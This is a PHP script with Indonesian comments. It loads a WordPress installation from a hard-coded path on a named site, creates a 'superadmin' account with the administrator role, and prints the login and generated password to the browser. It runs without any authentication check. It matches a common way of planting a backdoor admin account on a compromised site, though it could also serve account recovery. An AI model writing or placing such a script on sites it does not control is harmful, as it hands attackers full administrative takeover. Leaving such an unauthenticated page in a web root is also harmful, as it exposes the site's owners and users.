<?php
/**
 * Script untuk membuat admin WordPress dengan path custom ke wp-config.php
 */

// Fungsi untuk menghasilkan password acak yang kuat
function generateStrongPassword($length = 16) {
    $sets = [];
    $sets[] = 'abcdefghjkmnpqrstuvwxyz';
    $sets[] = 'ABCDEFGHJKMNPQRSTUVWXYZ';
    $sets[] = '23456789';
    $sets[] = '!@#$%^&*()_+-=[]{}|;:,.<>?';

    $password = '';
    
    foreach ($sets as $set) {
        $password .= $set[random_int(0, strlen($set) - 1)];
    }
    
    $allChars = implode('', $sets);
    for ($i = strlen($password); $i < $length; $i++) {
        $password .= $allChars[random_int(0, strlen($allChars) - 1)];
    }
    
    $password = str_shuffle($password);
    
    return $password;
}

// Pastikan script diakses dengan cara yang valid
if (php_sapi_name() !== 'cli' && !isset($_SERVER['HTTP_HOST'])) {
    die('Script ini harus diakses melalui browser atau command line.');
}

// ======== MODIFIKASI DI SINI ========
// Tentukan path lengkap ke wp-config.php
$wp_config_path = '/var/www/vhosts/schau-mer-mal.info/httpdocs/wp-config.php'; // Ganti dengan path absolut Anda

// Contoh:
// $wp_config_path = '/home/username/public_html/wp-config.php';
// $wp_config_path = 'C:\xampp\htdocs\website\wp-config.php';

// Cek apakah file wp-config.php ada di path yang ditentukan
if (!file_exists($wp_config_path)) {
    die('Error: File wp-config.php tidak ditemukan di: ' . $wp_config_path);
}

// Dapatkan direktori WordPress dari path wp-config.php
$wp_dir = dirname($wp_config_path);

// Load WordPress environment
require_once($wp_config_path);
require_once($wp_dir . '/wp-load.php');
require_once($wp_dir . '/wp-includes/pluggable.php');
// ======== END MODIFIKASI ========

// Konfigurasi admin baru
$username = 'superadmin'; // Ganti dengan username yang diinginkan
$password = generateStrongPassword(); // Password acak yang kuat
$email = 'coimai@example.com'; // Ganti dengan email yang valid

// Cek jika user sudah ada
if (username_exists($username)) {
    die("Error: Username '$username' sudah terdaftar.");
}

if (email_exists($email)) {
    die("Error: Email '$email' sudah terdaftar.");
}

// Buat user baru
$user_id = wp_create_user($username, $password, $email);

if (is_wp_error($user_id)) {
    die("Error saat membuat user: " . $user_id->get_error_message());
}

// Set role user sebagai administrator
$user = new WP_User($user_id);
$user->set_role('administrator');

// Output hasil
echo "<h2>Admin WordPress berhasil dibuat!</h2>";
echo "<div style='background:#f5f5f5; padding:20px; border-radius:5px; font-family:monospace;'>";
echo "<strong>Detail Login:</strong><br>";
echo "URL Login: " . esc_url(wp_login_url()) . "<br>";
echo "Username: <strong>" . esc_html($username) . "</strong><br>";
echo "Password: <strong>" . esc_html($password) . "</strong><br>";
echo "Email: " . esc_html($email) . "<br>";
echo "</div>";

// Jika diakses via browser, tampilkan style yang lebih baik
if (!empty($_SERVER['HTTP_HOST'])) {
    echo "<style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 20px;
            color: #333;
        }
        h2 {
            color: #2271b1;
        }
    </style>";
}
?>
